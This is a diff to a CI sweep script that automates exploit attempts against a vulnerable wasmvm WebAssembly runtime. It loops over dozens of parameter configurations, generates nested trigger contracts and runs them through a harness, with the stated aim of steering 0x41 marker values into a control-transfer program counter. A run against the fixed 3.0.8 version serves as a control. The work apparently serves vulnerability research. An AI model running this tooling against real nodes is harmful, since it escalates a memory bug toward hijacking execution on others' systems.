@@ -245,6 +245,27 @@ if [ -n "$PY" ]; then
   done
   echo "  full-phase canary sweep done" | tee -a "$OUT/sweep.log"
 
+  echo "--- MARKER RETRY BURST (37 winning parity configs x20; --plants distinct) ---"
+  echo "    The 45 GADGET-CONSUMED samples from the parity grid show our distinct markers reaching" >&2
+  echo "    consumed slots (addr=0x414141...); burst them to farm a PC=0x41.. (control transfer)." >&2
+  for CFG in "0 0 273" "0 0 274" "0 1 273" "0 1 274" "0 1 275" "0 2 243" "0 2 274" "0 2 276" "0 3 274" "0 3 275" "0 3 276" \
+             "1 0 272" "1 0 274" "1 1 272" "1 1 273" "1 1 274" "1 2 242" "1 2 274" "1 2 275" "1 3 242" "1 3 273" "1 3 275" \
+             "2 0 272" "2 0 273" "2 1 272" "2 1 273" "2 1 274" "2 2 242" "2 2 274" "2 2 275" "2 3 275" \
+             "3 0 272" "3 0 273" "3 1 271" "3 1 272" "3 1 273" "3 2 241"; do
+    set -- $CFG; F=$1; DUM2=$2; R=$3
+    OFF=$((512 - R)); ITERS=$((65536 + R + 1))
+    for A in $(seq 1 20); do
+      D6="$NESTED/mk_f${F}_d${DUM2}_r${R}_a${A}"
+      python3 "$NESTED/gen_nested_contracts.py" "$D6" --offset "$OFF" --iters "$ITERS" --dummy "$DUM2" --plants distinct --frame32 "$F" > /dev/null 2>&1 || continue
+      for w in holder trigger benign; do
+        "$PY" -c "import wasmtime; open('$D6/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D6/$w.wat').read()))" 2>/dev/null
+      done
+      timeout 120 ./harness/harness -wasm "$D6/holder.wasm" -trigger "$D6/trigger.wasm" -benign "$D6/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-mk-f${F}-d${DUM2}-r${R}-a${A}.json" > "ci-out/harness/nested-vuln-mk-f${F}-d${DUM2}-r${R}-a${A}.stdout" 2> "ci-out/harness/nested-vuln-mk-f${F}-d${DUM2}-r${R}-a${A}.stderr" || true
+    done
+    echo "  mk f$F/d$DUM2/r$R done" | tee -a "$OUT/sweep.log"
+  done
+  echo "  marker retry burst done" | tee -a "$OUT/sweep.log"
+
   echo "--- fixed control (wasmvm 3.0.8, r=256) ---"
   D="$NESTED/build_r256"
   if timeout 120 ./harness-fixed/harness-fixed -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 4 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-fixed-r256.json" > "ci-out/harness/nested-fixed-r256.stdout" 2> "ci-out/harness/nested-fixed-r256.stderr"; then
@@ -262,7 +283,10 @@ gadget_consumed = []
 
 def classify(f, dummy):
     base = f.split("/")[-1]
-    if base.startswith("nested-vuln-can-"):
+    if base.startswith("nested-vuln-mk-"):
+        mm = re.search(r'mk-f(\d+)-d(\d+)-r(\d+)-a(\d+)', f)
+        tag = f"mk/f{mm.group(1)}/d{mm.group(2)}/r{mm.group(3)}/a{mm.group(4)}" if mm else f"mk/{base}"
+    elif base.startswith("nested-vuln-can-"):
         mm = re.search(r'can-r(\d+)-a(\d+)', f)
         tag = f"can/r{mm.group(1)}/a{mm.group(2)}" if mm else f"can/{base}"
     elif base.startswith("nested-vuln-fp-"):
@@ -338,6 +362,8 @@ for f in sorted(glob.glob("ci-out/harness/nested-vuln-sa-*.stderr")):
 for f in sorted(glob.glob("ci-out/harness/nested-vuln-fp-*.stderr")):
     classify(f, None)
 for f in sorted(glob.glob("ci-out/harness/nested-vuln-can-*.stderr")):
+    classify(f, None)
+for f in sorted(glob.glob("ci-out/harness/nested-vuln-mk-*.stderr")):
     classify(f, None)
 
 print("AIMED-PIVOT HITS (SIGILL):", len(aimed), aimed[:40])
